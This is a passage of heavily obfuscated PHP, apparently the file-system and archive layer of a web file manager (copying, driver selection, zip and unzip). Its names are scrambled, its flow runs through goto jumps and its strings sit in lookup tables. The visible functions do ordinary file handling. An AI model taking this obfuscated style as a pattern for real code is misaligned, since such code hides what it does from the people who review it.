$fï˜ĞÙ÷•†) { IO::mkdir($fï˜ĞÙ÷•†); } foreach ($BåÈæ“ˆ’Ê as $fï˜ĞÙ÷•†) { IO::copy($fï˜ĞÙ÷•†[$D‡™‹ ˜ö§[1079]], $fï˜ĞÙ÷•†[$D‡™‹ ˜ö§[1080]], REPEAT_REPLACE); } goto cÎ®±¢ø¤; cÕæÆ¸¶ğ‹: $cê³„Ø“˜ = self::_listAll($B„™ñ¨ğç“); $a¡ßùÁ®¸Ø = self::_listAll($bˆå”Îéœà); $BåÈæ“ˆ’Ê = array(); goto b¿°øø„; FäÔ°µß¸÷: $D‡™‹ ˜ö§ =& $_SERVER[›èö’ù¤]; if (!IO::exist($B„™ñ¨ğç“)) { return !1; } if (!IO::exist($bˆå”Îéœà)) { IO::mkdir($bˆå”Îéœà); } goto cÕæÆ¸¶ğ‹; b¿°øø„: $eÊä¸†Ğ÷’ = array(); foreach ($cê³„Ø“˜ as $a¯¦òÆ„È => $fï˜ĞÙ÷•†) { if (isset($a¡ßùÁ®¸Ø[$a¯¦òÆ„È])) { if ($fï˜ĞÙ÷•†[$D‡™‹ ˜ö§[77]] == 1) { continue; } if ($a¡ßùÁ®¸Ø[$a¯¦òÆ„È][$D‡™‹ ˜ö§[78]] == $fï˜ĞÙ÷•†[$D‡™‹ ˜ö§[78]]) { continue; } } if ($fï˜ĞÙ÷•†[$D‡™‹ ˜ö§[77]] == 1) { $eÊä¸†Ğ÷’[] = $bˆå”Îéœà . $D‡™‹ ˜ö§[8] . $a¯¦òÆ„È; continue; } $DáİÑ™‹• = strstr(trim($a¯¦òÆ„È, $D‡™‹ ˜ö§[8]), $D‡™‹ ˜ö§[8]) ? get_path_father($a¯¦òÆ„È) : $D‡™‹ ˜ö§[33]; $BåÈæ“ˆ’Ê[] = array($D‡™‹ ˜ö§[1079] => $fï˜ĞÙ÷•†[$D‡™‹ ˜ö§[76]], $D‡™‹ ˜ö§[1080] => rtrim($bˆå”Îéœà, $D‡™‹ ˜ö§[8]) . $D‡™‹ ˜ö§[8] . $DáİÑ™‹•, $D‡™‹ ˜ö§[1081] => $fï˜ĞÙ÷•†); } $aßé´Ãâ“± = array($D‡™‹ ˜ö§[193] => $BåÈæ“ˆ’Ê, $D‡™‹ ˜ö§[77] => $eÊä¸†Ğ÷’); goto cÒõï¨™§À; cÎ®±¢ø¤: } private static function _listAll($CÅóÍõš©ˆ) { $D…†¯ØÑó =& $_SERVER[›èö’ù¤]; $CÅóÍõš©ˆ = KodIO::clear($CÅóÍõš©ˆ); $b†±È±Èª„ = IO::listAll($CÅóÍõš©ˆ); foreach ($b†±È±Èª„ as &$bº™…¡¶¹Ş) { $cæ ëÊ¶ôô = substr($bº™…¡¶¹Ş[$D…†¯ØÑó[76]], strlen($CÅóÍõš©ˆ)); $bº™…¡¶¹Ş[$D…†¯ØÑó[1083]] = trim($cæ ëÊ¶ôô, $D…†¯ØÑó[8]); } unset($bº™…¡¶¹Ş); return array_to_keyvalue($b†±È±Èª„, $D…†¯ØÑó[1083]); } public static function fileSubstr($bÚ¿¥Ãš†Œ, $dƒ•¡—¾‚Ï, $E”òñ…‰¥ë = false) { goto c¹™ëÛŠÒ; bÔËõÆàëƒ: if (!$C°Ş†æô¡² && $E”òñ…‰¥ë && isset($GLOBALS[$e‡ô‘‹¶•[1086]])) { throw new Exception($GLOBALS[$e‡ô‘‹¶•[1086]][$e‡ô‘‹¶•[1087]]); } return $C°Ş†æô¡²; goto Bƒ’Ø‘Û½‡; eœ‘×óš·å: $C‹ÛáÂ£Õ  = $dƒ•¡—¾‚Ï; $E³¾¤áğŒ¢ = $E”òñ…‰¥ë; if ($dƒ•¡—¾‚Ï < 0) { $dƒ•¡—¾‚Ï = $E‚½™ÄŠ¡å + $dƒ•¡—¾‚Ï; } goto CÇµ§ì‡´—; cµÛ–÷Ô•: if ($E”òñ…‰¥ë <= 0) { return $e‡ô‘‹¶•[33]; } if ($dƒ•¡—¾‚Ï < 0 || $dƒ•¡—¾‚Ï >= $E‚½™ÄŠ¡å || $E”òñ…‰¥ë > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\122\x65\141\144\40\145\162\x72\157\x72\41\x20\163\x74\141\x72\x74\75{$dƒ•¡—¾‚Ï}\x3b\154\x65\x6e\147\164\x68\75{$E”òñ…‰¥ë}\x3b\x20\x73\151\x7a\x65\x3d{$E‚½™ÄŠ¡å}\x3b"); } $C°Ş†æô¡² = $B÷ÌÆ½”íİ->fileSubstr($bÚ¿¥Ãš†Œ, $dƒ•¡—¾‚Ï, $E”òñ…‰¥ë); goto bÔËõÆàëƒ; c¹™ëÛŠÒ: $e‡ô‘‹¶• =& $_SERVER[›èö’ù¤]; $B÷ÌÆ½”íİ = self::driverMake($bÚ¿¥Ãš†Œ); $E‚½™ÄŠ¡å = $B÷ÌÆ½”íİ->size($bÚ¿¥Ãš†Œ); goto eœ‘×óš·å; CÇµ§ì‡´—: if ($E”òñ…‰¥ë === !1) { $E”òñ…‰¥ë = $E‚½™ÄŠ¡å - $dƒ•¡—¾‚Ï; } if ($dƒ•¡—¾‚Ï + $E”òñ…‰¥ë > $E‚½™ÄŠ¡å) { $E”òñ…‰¥ë = $E‚½™ÄŠ¡å - $dƒ•¡—¾‚Ï; } if (!$E‚½™ÄŠ¡å && $B÷ÌÆ½”íİ->getType() == $e‡ô‘‹¶•[106] && !$B÷ÌÆ½”íİ->exist($bÚ¿¥Ãš†Œ)) { throw new Exception($e‡ô‘‹¶•[1084] . LNG($e‡ô‘‹¶•[1085]) . $e‡ô‘‹¶•[950] . get_path_this($bÚ¿¥Ãš†Œ) . $e‡ô‘‹¶•[33]); } goto cµÛ–÷Ô•; Bƒ’Ø‘Û½‡: } private static function driverMake(&$dœµ¥ïÚ×Ù) { goto fÈô¹Ô“Åä; fÈô¹Ô“Åä: $d›İ¹¶„Ò =& $_SERVER[›èö’ù¤]; $E¼©”Ö«„Ù = KodIO::parse($dœµ¥ïÚ×Ù); if (!self::$driverListSystem) { $E³Š°½’ÔÌ = Model($d›İ¹¶„Ò[751])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($E³Š°½’ÔÌ, $d›İ¹¶„Ò[395]); } goto AœÀŠË¶“º; AœÀŠË¶“º: if ($E¼©”Ö«„Ù[$d›İ¹¶„Ò[29]] == KodIO::KOD_IO && !self::$driverListSystem[$E¼©”Ö«„Ù[$d›İ¹¶„Ò[395]]]) { return !1; } $dœµ¥ïÚ×Ù = $E¼©”Ö«„Ù[$d›İ¹¶„Ò[1088]]; $CÅšÔÃî»Ê = self::driverGet($E¼©”Ö«„Ù, $dœµ¥ïÚ×Ù); goto AÁñ¥‰ÕºÀ; AÁñ¥‰ÕºÀ: return $CÅšÔÃî»Ê; goto EÌ‰ğÖ½“‚; EÌ‰ğÖ½“‚: } private static function driverGet($BÒÂ‰ˆŸ•, &$C·ŸãÍ­´©) { goto e¾öÛ¢©ğš; B÷Éá»Õáï: if (isset($E¥ÑİíÔ‚[$Bàîƒœ¥‡[6]][$Bàîƒœ¥‡[1100]])) { $A‹‚®±îÜ->pathBase = rtrim($E¥ÑİíÔ‚[$Bàîƒœ¥‡[6]][$Bàîƒœ¥‡[1100]], $Bàîƒœ¥‡[8]) . $Bàîƒœ¥‡[8]; $C·ŸãÍ­´© = $A‹‚®±îÜ->pathBase . ltrim($C·ŸãÍ­´©, $Bàîƒœ¥‡[8]); } $C·ŸãÍ­´© = $A‹‚®±îÜ->getPath($C·ŸãÍ­´©); if (isset($BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[1072]])) { $C·ŸãÍ­´© = $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[1072]]; } goto A±éàÜóÊÖ; cõ–©íŒæ¯: switch ($BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[29]]) { case KodIO::KOD_IO: $E¥ÑİíÔ‚ = self::$driverListSystem[$C§£…Ò²§­]; break; case KodIO::KOD_SOURCE: $C·ŸãÍ­´© = $C§£…Ò²§­ . $C·ŸãÍ­´©; $E¥ÑİíÔ‚ = array($Bàîƒœ¥‡[1090] => $Bàîƒœ¥‡[1091], $Bàîƒœ¥‡[6] => $BÒÂ‰ˆŸ•); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $B§Ûä…óæ® = $GLOBALS[$Bàîƒœ¥‡[1092]]; self::$driverListUser = array_to_keyvalue($B§Ûä…óæ®, $Bàîƒœ¥‡[395]); } $E¥ÑİíÔ‚ = self::$driverListUser[$C§£…Ò²§­]; break; case KodIO::KOD_SHARE_LINK: $E¥ÑİíÔ‚ = array($Bàîƒœ¥‡[1090] => $Bàîƒœ¥‡[1093], $Bàîƒœ¥‡[6] => $BÒÂ‰ˆŸ•); $e±ë»ÉÁùÔ = Action($Bàîƒœ¥‡[1094])->sharePathInfo($BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[76]]); $C·ŸãÍ­´© = $e±ë»ÉÁùÔ[$Bàîƒœ¥‡[397]]; if (!$e±ë»ÉÁùÔ[$Bàîƒœ¥‡[397]]) { $Aš½‡’Üâ = Model($Bàîƒœ¥‡[590])->getInfo($e±ë»ÉÁùÔ[$Bàîƒœ¥‡[483]]); $C·ŸãÍ­´© = KodIO::clear($Aš½‡’Üâ[$Bàîƒœ¥‡[1095]] . $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[1088]]); $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[481]] = $Aš½‡’Üâ; $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[1072]] = $C·ŸãÍ­´©; $E¥ÑİíÔ‚ = array($Bàîƒœ¥‡[1090] => $Bàîƒœ¥‡[1096], $Bàîƒœ¥‡[6] => $BÒÂ‰ˆŸ•); } break; case KodIO::KOD_SHARE_ITEM: $E¥ÑİíÔ‚ = array($Bàîƒœ¥‡[1090] => $Bàîƒœ¥‡[1097], $Bàîƒœ¥‡[6] => $BÒÂ‰ˆŸ•); $Aš½‡’Üâ = Model($Bàîƒœ¥‡[590])->getInfo($BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[395]]); if ($Aš½‡’Üâ[$Bàîƒœ¥‡[397]] == $Bàîƒœ¥‡[191]) { $C·ŸãÍ­´© = KodIO::clear($Aš½‡’Üâ[$Bàîƒœ¥‡[1095]] . $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[1088]]); $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[481]] = $Aš½‡’Üâ; $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[1072]] = $C·ŸãÍ­´©; $E¥ÑİíÔ‚ = array($Bàîƒœ¥‡[1090] => $Bàîƒœ¥‡[1098], $Bàîƒœ¥‡[6] => $BÒÂ‰ˆŸ•); } else { if (!$C·ŸãÍ­´©) { $C·ŸãÍ­´© = $Aš½‡’Üâ[$Bàîƒœ¥‡[397]]; } } break; default: $C·ŸãÍ­´© = $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[76]]; $E¥ÑİíÔ‚ = array($Bàîƒœ¥‡[1090] => $Bàîƒœ¥‡[1099]); break; } $D¼Èº†ùÌÍ = $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[76]]; if (!isset(self::$driverCache[$D¼Èº†ùÌÍ])) { $d‘ß¹Ü‚ƒò = strtolower($E¥ÑİíÔ‚[$Bàîƒœ¥‡[94]]); $C£ àë¹Šà = $GLOBALS[$Bàîƒœ¥‡[6]][$Bàîƒœ¥‡[88]][$Bàîƒœ¥‡[817]]; $D‡¡˜§‘Ù = $Bàîƒœ¥‡[72] . (isset($C£ àë¹Šà[$d‘ß¹Ü‚ƒò]) ? $C£ àë¹Šà[$d‘ß¹Ü‚ƒò] : ucfirst($d‘ß¹Ü‚ƒò)); if (!class_exists($D‡¡˜§‘Ù)) { show_json("{$D‡¡˜§‘Ù}\40\x6e\x6f\x74\40\x65\170\x69\163\x74\163\x21", !1); } $F©–‰Éªõ = isset($E¥ÑİíÔ‚[$Bàîƒœ¥‡[6]]) ? $E¥ÑİíÔ‚[$Bàîƒœ¥‡[6]] : !1; self::$driverCache[$D¼Èº†ùÌÍ] = new $D‡¡˜§‘Ù($F©–‰Éªõ); } goto FÒÄÁÊ¾„–; FÒÄÁÊ¾„–: $A‹‚®±îÜ = self::$driverCache[$D¼Èº†ùÌÍ]; $A‹‚®±îÜ->pathDriver = $dÁ‡±øä¡; $A‹‚®±îÜ->pathBase = $Bàîƒœ¥‡[33]; goto B÷Éá»Õáï; A±éàÜóÊÖ: $A‹‚®±îÜ->path = $C·ŸãÍ­´©; return $A‹‚®±îÜ; goto A§ŒáÌ‚; e¾öÛ¢©ğš: $Bàîƒœ¥‡ =& $_SERVER[›èö’ù¤]; $dÁ‡±øä¡ = $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[1089]]; $C§£…Ò²§­ = $BÒÂ‰ˆŸ•[$Bàîƒœ¥‡[395]]; goto cõ–©íŒæ¯; A§ŒáÌ‚: } public static function errorTips($dµÔ’˜å‚« = false) { goto A°ˆïÛ›µ; Cìˆ·“Õ¥«: if ($dµÔ’˜å‚« === -1) { return $FÇË‹‡õ‹ ? $FÇË‹‡õ‹[count($FÇË‹‡õ‹) - 1] : $AÍ†²ÍÚ¼ô[33]; } if ($dµÔ’˜å‚« === !1) { return implode($AÍ†²ÍÚ¼ô[229], $FÇË‹‡õ‹); } if (count($FÇË‹‡õ‹) >= $D—õãóâ–) { $FÇË‹‡õ‹ = array_slice($FÇË‹‡õ‹, $D—õãóâ– * 0.5, $D—õãóâ–); } goto eÁ¦‘’Ñô„; eÁ¦‘’Ñô„: $FÇË‹‡õ‹[] = $dµÔ’˜å‚«; write_log($AÍ†²ÍÚ¼ô[160] . ACTION . $AÍ†²ÍÚ¼ô[1101] . $dµÔ’˜å‚«, $AÍ†²ÍÚ¼ô[1102]); goto CÄéèˆê§„; A°ˆïÛ›µ: $AÍ†²ÍÚ¼ô =& $_SERVER[›èö’ù¤]; static $FÇË‹‡õ‹ = array(); $D—õãóâ– = 1000; goto Cìˆ·“Õ¥«; CÄéèˆê§„: } public static function getLastError($D§ÉÖŒ‹Ç„ = '') { $Cˆ‡ğäğÑ± = self::errorTips(-1); return $Cˆ‡ğäğÑ± ? $Cˆ‡ğäğÑ± : $D§ÉÖŒ‹Ç„; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $D…éÎ¾ôã±; if (!$D…éÎ¾ôã±) { $b¦ŸØÑëˆ = IO::init($_SERVER[›èö’ù¤][8]); } return $b¦ŸØÑëˆ; } private static function iconvSystem($B’Ñ’´¡Ã®) { return self::local()->iconvSystem($B’Ñ’´¡Ã®); } private static function iconvApp($D…«Ëƒİ) { return self::local()->iconvApp($D…«Ëƒİ); } public static function zip($b†â†ª¢À, $c®ËŞğø¦µ = "\x7a\x69\160", $d‡ì¯–¼¹¤ = '', $AŠ¢êÒï† = REPEAT_RENAME) { goto bÇË³Šºõç; DŠêª„×š: $CÎÁ¿Øß÷Ú = !1; if (!$d‡ì¯–¼¹¤ && $B¬Ç„ÓöÍİ->getType() == $B¯ùƒ ©±…[106]) { $Ağßƒµâ»§ = self::zipFileList($b†â†ª¢À); } else { $CÎÁ¿Øß÷Ú = $d‡ì¯–¼¹¤ ? $d‡ì¯–¼¹¤ : TEMP_FILES . $B¯ùƒ ©±…[1103] . time() . rand_string(8) . $B¯ùƒ ©±…[8]; mk_dir($CÎÁ¿Øß÷Ú); $Ağßƒµâ»§ = self::zipFileList($b†â†ª¢À, $CÎÁ¿Øß÷Ú); } $e•…‚êÛ– = $E­…¶¦®îÒ[$B¯ùƒ ©±…[28]]; goto DºïÇ˜ÌÛ§; DŸÇ—ÊŒ‚: if ($d‡ì¯–¼¹¤ || !$CÎÁ¿Øß÷Ú) { if ($CÎÁ¿Øß÷Ú && strstr($CÎÁ¿Øß÷Ú, TEMP_FILES)) { $dºÎ£…“Ç¸ = $Ağßƒµâ»§ = array(); recursion_dir($fšÃäõ©Ãƒ, $dºÎ£…“Ç¸, $Ağßƒµâ»§, 0); foreach ($dºÎ£…“Ç¸ as $D¼…ĞÃ•Áñ) { del_dir($D¼…ĞÃ•Áñ); } foreach ($Ağßƒµâ»§ as $e„«İÎ½–Ğ) { if ($e„«İÎ½–Ğ == $FñÎ•œ¹ÚÉ) { continue; } del_file($e„«İÎ½–Ğ); } } return $Fï‰ó©ºØß; } $CÚøÁáöÅ = self::pathFather($E­…¶¦®îÒ[$B¯ùƒ ©±…[76]]); $EÀëÙí¶ôï = self::move($Fï‰ó©ºØß, $CÚøÁáöÅ, $AŠ¢êÒï†); goto c„º“ó‚Î—; Dôâó¾Â…Õ: $Fï‰ó©ºØß = $fšÃäõ©Ãƒ . $e•…‚êÛ– . $B¯ùƒ ©±…[95] . $c®ËŞğø¦µ; $Fï‰ó©ºØß = get_filename_auto($Fï‰ó©ºØß, $B¯ùƒ ©±…[33], $AŠ¢êÒï†); $FñÎ•œ¹ÚÉ = self::iconvSystem($Fï‰ó©ºØß); goto dÂš¨Ì§é‹; bÇË³Šºõç: $B¯ùƒ ©±… =& $_SERVER[›èö’ù¤]; $B¬Ç„ÓöÍİ = self::init($b†â†ª¢À[0][$B¯ùƒ ©±…[76]]); $E­…¶¦®îÒ = self::info($b†â†ª¢À[0][$B¯ùƒ ©±…[76]]); goto DŠêª„×š; dÂš¨Ì§é‹: foreach ($Ağßƒµâ»§ as $a®²Ò¢·ó => $E›Ó¿î¬Ò…) { $Ağßƒµâ»§[$a®²Ò¢·ó] = self::iconvSystem($E›Ó¿î¬Ò…); } KodArchive::create($FñÎ•œ¹ÚÉ, $Ağßƒµâ»§); if (!IO::exist($Fï‰ó©ºØß)) { if ($CÎÁ¿Øß÷Ú) { del_dir($CÎÁ¿Øß÷Ú); } show_json(LNG($B¯ùƒ ©±…[1105]), !1); } goto DŸÇ—ÊŒ‚; DºïÇ˜ÌÛ§: if (count($Ağßƒµâ»§) > 1) { $fÆØããÌ = IO::info(IO::pathFather($E­…¶¦®îÒ[$B¯ùƒ ©±…[76]])); $e•…‚êÛ– = $fÆØããÌ[$B¯ùƒ ©±…[28]]; } $fšÃäõ©Ãƒ = $CÎÁ¿Øß÷Ú; if (!$fšÃäõ©Ãƒ) { $fšÃäõ©Ãƒ = get_path_father($E­…¶¦®îÒ[$B¯ùƒ ©±…[76]]); if (!$d‡ì¯–¼¹¤ && $B¬Ç„ÓöÍİ->getType() == $B¯ùƒ ©±…[106]) { $fšÃäõ©Ãƒ = get_path_father($B¬Ç„ÓöÍİ->path); } $B”ËÈ†Ê = IO::info($fšÃäõ©Ãƒ); if (!$B”ËÈ†Ê[$B¯ùƒ ©±…[196]]) { show_json(LNG($B¯ùƒ ©±…[1104]), !1); } } goto Dôâó¾Â…Õ; c„º“ó‚Î—: if (!$EÀëÙí¶ôï) { del_dir($CÎÁ¿Øß÷Ú); show_json(LNG($B¯ùƒ ©±…[1105]), !1); } del_dir($CÎÁ¿Øß÷Ú); return $EÀëÙí¶ôï; goto aŒŞ™ô¬§Ô; aŒŞ™ô¬§Ô: } public static function unzip($fÌá÷å, $F«á³£—× = "\x72\145\160\154\141\143\x65") { goto BÛ¿Õ¡­“Å; dÙöÏº÷¶É: if (!@file_exists(self::iconvSystem($A¦£ƒİÌİŞ))) { $cÈêİåó÷õ = self::localFilePath($a‚±ğĞ†ğí, $b¤ÀïùÌ¤«); $A¦£ƒİÌİŞ = $cÈêİåó÷õ ? $cÈêİåó÷õ : parent::download($a‚±ğĞ†ğí, $A¦£ƒİÌİŞ); } $A¦£ƒİÌİŞ = self::iconvSystem($A¦£ƒİÌİŞ); $fùÜÖä¦Õƒ = isset($fÌá÷å[$D…œ‘İ¾Âµ[1108]]) ? $fÌá÷å[$D…œ‘İ¾Âµ[1108]] : $D…œ‘İ¾Âµ[1109]; goto f½âù¢¢ƒÊ; C—ğÍ™¨‰: Hook::trigger($D…œ‘İ¾Âµ[1113], $C÷ÙÎìã¶); recursion_dir($C÷ÙÎìã¶, $A¦ë®ğÆòª, $Cí²Æ¯³©¬, 0); $e³¡º²Ç÷§ = array_merge($A¦ë®ğÆòª, $Cí²Æ¯³©¬); goto Cáïö“Ÿ¢; Cáïö“Ÿ¢: foreach ($e³¡º²Ç÷§ as $c—¼«ŠÆò¾) { $c—¼«ŠÆò¾ = self::iconvApp($c—¼«ŠÆò¾); self::move($c—¼«ŠÆò¾, $Cê›È­è, $F«á³£—×); } del_dir($C÷ÙÎìã¶); if (!$cÈêİåó÷õ) { del_file($A¦£ƒİÌİŞ); } goto bÈƒŞ…‹ñŒ; aÂÌœÀòæ: $fÕÜß¬¦ = self::tmpFileName($bï—£¹¦‹); $C÷ÙÎìã¶ = TEMP_FILES . $fÕÜß¬¦; del_dir($C÷ÙÎìã¶); goto B›Àò¹áè²; B›Àò¹áè²: mk_dir($C÷ÙÎìã¶); $b¤ÀïùÌ¤« = self::fileExt($bï—£¹¦‹); $A¦£ƒİÌİŞ = $C÷ÙÎìã¶ . $D…œ‘İ¾Âµ[95] . $b¤ÀïùÌ¤«; goto dÙöÏº÷¶É; bÈƒŞ…‹ñŒ: return !0; goto FÜ†íô½º¶; f½âù¢¢ƒÊ: $e¥¿¿É×Ù¨ = KodArchive::extract($A¦£ƒİÌİŞ, $C÷ÙÎìã¶ . $D…œ‘İ¾Âµ[8], $fùÜÖä¦Õƒ); self::archiveExt(); if (!$e¥¿¿É×Ù¨[$D…œ‘İ¾Âµ[1110]]) { show_json($D…œ‘İ¾Âµ[1111] . $e¥¿¿É×Ù¨[$D…œ‘İ¾Âµ[1112]], !1); } goto C—ğÍ™¨‰; AƒÍ ¥æÇ†: if (!($bï—£¹¦‹ = parent::info($a‚±ğĞ†ğí))) { show_json(LNG($D…œ‘İ¾Âµ[1107]), !1); } if (!($d…ˆØ™éŸØ = parent::infoFull($Cê›È­è))) { $Cê›È­è = parent::mkdir($Cê›È­è); $d…ˆØ™éŸØ = array($D…œ‘İ¾Âµ[76] => $Cê›È­è); } else { if (isset($d…ˆØ™éŸØ[$D…œ‘İ¾Âµ[397]]) && trim($d…ˆØ™éŸØ[$D…œ‘İ¾Âµ[76]], $D…œ‘İ¾Âµ[8]) != trim($Cê›È­è, $D…œ‘İ¾Âµ[8])) { $f§ù…×‡ğ° = KodIO::make($d…ˆØ™éŸØ[$D…œ‘İ¾Âµ[493]]); $BĞ£áå½« = parent::fileNameAuto($f§ù…×‡ğ°, $d…ˆØ™éŸØ[$D…œ‘İ¾Âµ[28]], REPEAT_RENAME_FOLDER, !0); $Cê›È­è = parent::mkdir($f§ù…×‡ğ° . $BĞ£áå½«); $d…ˆØ™éŸØ = array($D…œ‘İ¾Âµ[76] => $Cê›È­è); } } $Cê›È­è = $d…ˆØ™éŸØ[$D…œ‘İ¾Âµ[76]]; goto aÂÌœÀòæ; BÛ¿Õ¡­“Å: $D…œ‘İ¾Âµ =& $_SERVER[›èö’ù¤]; $a‚±ğĞ†ğí = $fÌá÷å[$D…œ‘İ¾Âµ[76]]; $Cê›È­è = $fÌá÷å[$D…œ‘İ¾Âµ[1106]]; goto AƒÍ ¥æÇ†; FÜ†íô½º¶: } public static function unzipList($BËŒïˆİ‡ˆ) { goto BëàõùØíÚ; A¹Á©‚²ê¿: $FÑÖ·À£Å• = self::info($Aº­¼Âø…); $E•ÓóŸë×Ë = self::fileExt($FÑÖ·À£Å•); $aŸœ£ŒöÑ° = self::tmpFileName($FÑÖ·À£Å•); goto Eò…à¡ÈÎ×; fÍ¯°Ï¥•‡: self::archiveExt(); del_dir($FŠì¹×‘š); if (!$fÍ±ï¯Ÿ‰[$E÷±¯«[1110]]) { show_json($fÍ±ï¯Ÿ‰[$E÷±¯«[1112]], !1); } goto fƒÑ¢¿ØÃ¬; BëàõùØíÚ: $E÷±¯« =& $_SERVER[›èö’ù¤]; $bˆğ£³Â¦– = $BËŒïˆİ‡ˆ[$E÷±¯«[76]]; $bÓ¹õáå°Ÿ = isset($BËŒïˆİ‡ˆ[$E÷±¯«[1114]]) ? $BËŒïˆİ‡ˆ[$E÷±¯«[1114]] : -1; goto dçêãœğŸÑ; Cò£øÃÒ·»: return $fÍ±ï¯Ÿ‰[$E÷±¯«[1112]]; goto B—­çî­æÊ; dçêãœğŸÑ: $bôÊà¬Ø§Š = 50000; if (request_url_safe($bˆğ£³Â¦–)) { $fâÍÍï¡®® = parse_url_query($bˆğ£³Â¦–); if (!isset($fâÍÍï¡®®[$E÷±¯«[76]])) { show_json($E÷±¯«[1115], !1); } } $Aº­¼Âø… = isset($fâÍÍï¡®®) ? $fâÍÍï¡®®[$E÷±¯«[76]] : $bˆğ£³Â¦–; goto A¹Á©‚²ê¿; BÀˆˆãÕ: if (!is_dir($FŠì¹×‘š)) { mk_dir($FŠì¹×‘š); } $Bó»½¼´Ü  = $FŠì¹×‘š . $E÷±¯«[8] . $AÅï¦¥Øš’; if (!@file_exists(self::iconvSystem($Bó»½¼´Ü ))) { if (isset($fâÍÍï¡®®)) { url_request($bˆğ£³Â¦–, $E÷±¯«[1117], $Bó»½¼´Ü ); } else { $A•”ó¢š¸§ = self::localFilePath($bˆğ£³Â¦–, $E•ÓóŸë×Ë); $Bó»½¼´Ü  = $A•”ó¢š¸§ ? $A•”ó¢š¸§ : self::download($bˆğ£³Â¦–, $Bó»½¼´Ü ); } } goto e«éàœò„á; Eò…à¡ÈÎ×: if (isset($fâÍÍï¡®®)) { $AŸÓ²›Æœ· = array($fâÍÍï¡®®[$E÷±¯«[76]], $fâÍÍï¡®®[$E÷±¯«[1114]], $fâÍÍï¡®®[$E÷±¯«[28]]); $AÅï¦¥Øš’ = md5(implode($E÷±¯«[71], $AŸÓ²›Æœ·)) . $E÷±¯«[95] . get_path_ext($fâÍÍï¡®®[$E÷±¯«[28]]); } else { $AŸÓ²›Æœ· = array($FÑÖ·À£Å•[$E÷±¯«[28]], $FÑÖ·À£Å•[$E÷±¯«[76]], $FÑÖ·À£Å•[$E÷±¯«[78]]); $AÅï¦¥Øš’ = md5(implode($E÷±¯«[71], $AŸÓ²›Æœ·)) . $E÷±¯«[95] . $E•ÓóŸë×Ë; } if ($bÓ¹õáå°Ÿ == -1) { $dµîø†““ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\151\x65\167\x2f{$aŸœ£ŒöÑ°}\57{$AÅï¦¥Øš’}\x2e\x6c\x6f\x67"; $e¨’ÁŒ‚¸ = self::infoFull($dµîø†““); if ($e¨’ÁŒ‚¸) { $dµîø†““ = $e¨’ÁŒ‚¸[$E÷±¯«[76]]; $cÀ–ÙÍ¦Ë¥ = self::getContent($dµîø†““); if ($cÀ–ÙÍ¦Ë¥) { $c›ÎÀ‰ ¥ä = json_decode($cÀ–ÙÍ¦Ë¥, !0); if (count($c›ÎÀ‰ ¥ä) >= $bôÊà¬Ø§Š) { show_json(sprintf(LNG($E÷±¯«[1116]), count($c›ÎÀ‰ ¥ä)), !1); } return $c›ÎÀ‰ ¥ä; } } else { $dµîø†““ = self::mkfile($dµîø†““); } } $FŠì¹×‘š = TEMP_FILES . $aŸœ£ŒöÑ°; goto BÀˆˆãÕ; e«éàœò„á: $Bó»½¼´Ü  = self::iconvSystem($Bó»½¼´Ü ); if ($bÓ¹õáå°Ÿ >= 0) { $cØàÇ…™ô­ = isset($BËŒïˆİ‡ˆ[$E÷±¯«[1118]]) ? $BËŒïˆİ‡ˆ[$E÷±¯«[1118]] : !1; $bÂù‹Œì’ = isset($BËŒïˆİ‡ˆ[$E÷±¯«[28]]) ? $BËŒïˆİ‡ˆ[$E÷±¯«[28]] : $E÷±¯«[33]; KodArchive::filePreview($Bó»½¼´Ü , $bÓ¹õáå°Ÿ, $cØàÇ…™ô­, $bÂù‹Œì’); self::archiveExt(); die; } $fÍ±ï¯Ÿ‰ = KodArchive::listContent($Bó»½¼´Ü ); goto fÍ¯°Ï¥•‡; fƒÑ¢¿ØÃ¬: $c›ÎÀ‰ ¥ä = json_encode($fÍ±ï¯Ÿ‰[$E÷±¯«[1112]]); self::setContent($dµîø†““, $c›ÎÀ‰ ¥ä); if (count($fÍ±ï¯Ÿ‰[$E÷±¯«[1112]]) >= $bôÊà¬Ø§Š) { show_json(sprintf(LNG($E÷±¯«[1116]), count($fÍ±ï¯Ÿ‰[$E÷±¯«[1112]])), !1); } goto Cò£øÃÒ·»; B—­çî­æÊ: } private static function fileExt($c¨£˜¡Ü±¨) { $BæÔ«»µ =& $_SERVER[›èö’ù¤]; $a¸‚æãó†ø = $c¨£˜¡Ü±¨[$BæÔ«»µ[168]]; if ($a¸‚æãó†ø == $BæÔ«»µ[1119]) { $C”ïˆ™»¶§ = $BæÔ«»µ[1120]; if (substr($c¨£˜¡Ü±¨[$BæÔ«»µ[28]], -strlen($C”ïˆ™»¶§)) == $C”ïˆ™»¶§) { $a¸‚æãó†ø = $BæÔ«»µ[1121]; } } self::archiveExt($a¸‚æãó†ø); return $a¸‚æãó†ø; } private static function zipFileList($féòè¹±Ğ, $A£—İõ­Å¶ = false) { $A®íœ‹Â÷¹ =& $_SERVER[›èö’ù¤]; $f¦»¢æÃÌ = array(); foreach ($féòè¹±Ğ as $AÈäŒ™ˆ·İ) { $b¯Œ”²‡™ì = $AÈäŒ™ˆ·İ[$A®íœ‹Â÷¹[76]]; if ($A£—İõ­Å¶) { $b¯Œ”²‡™ì = self::copy($AÈäŒ™ˆ·İ[$A®íœ‹Â÷¹[76]], $A£—İõ­Å¶, $A®íœ‹Â÷¹[809]); } else { $Fòø‘©ï = self::init($AÈäŒ™ˆ·İ[$A®íœ‹Â÷¹[76]]); if ($Fòø‘©ï->getType() == $A®íœ‹Â÷¹[106]) { $b¯Œ”²‡™ì = 